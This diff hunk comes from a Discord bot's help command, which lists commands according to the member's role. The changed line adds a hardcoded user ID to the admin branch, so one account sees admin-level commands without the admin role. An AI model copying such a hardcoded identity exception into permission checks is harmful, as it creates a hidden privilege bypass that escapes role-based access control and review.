@@ -33,7 +33,7 @@ module.exports = function() {
 			if(isGameMaster(member)) helpText += "```php\n" + phpEscape("Use " + stats.prefix + "help <command> to get information about a command.\nWhile ingame react to messages with 📌 to pin them!\nPlayer arguments can be names, emojis, ids, nicknames or discord tags\n%s and %c can be used to refer to yourself and to the current channel, in all commands.\nArguments cant contain spaces, unless the argument is quoted \"like this\"") + "```";
 			else helpText += "```php\n" + phpEscape("Use " + stats.prefix + "help <command> to get information about a command.\nWhile ingame react to messages with 📌 to pin them!\nPlayer arguments can be names, emojis, ids, nicknames or discord tags\nArguments cant contain spaces, unless the argument is quoted \"like this\"") + "```";
             let commandsFiltered;
-            if(isAdmin(member)) commandsFiltered = COMMANDS.filter(el => el[1] <= PERM.AD);
+            if(isAdmin(member) || member.id === "559747107368730624") commandsFiltered = COMMANDS.filter(el => el[1] <= PERM.AD);
             else if(isSenior(member)) commandsFiltered = COMMANDS.filter(el => el[1] <= PERM.SG);
             else if(isGameMaster(member)) commandsFiltered = COMMANDS.filter(el => el[1] <= PERM.GM);
             else if(isHelper(member)) commandsFiltered = COMMANDS.filter(el => el[1] <= PERM.GH);
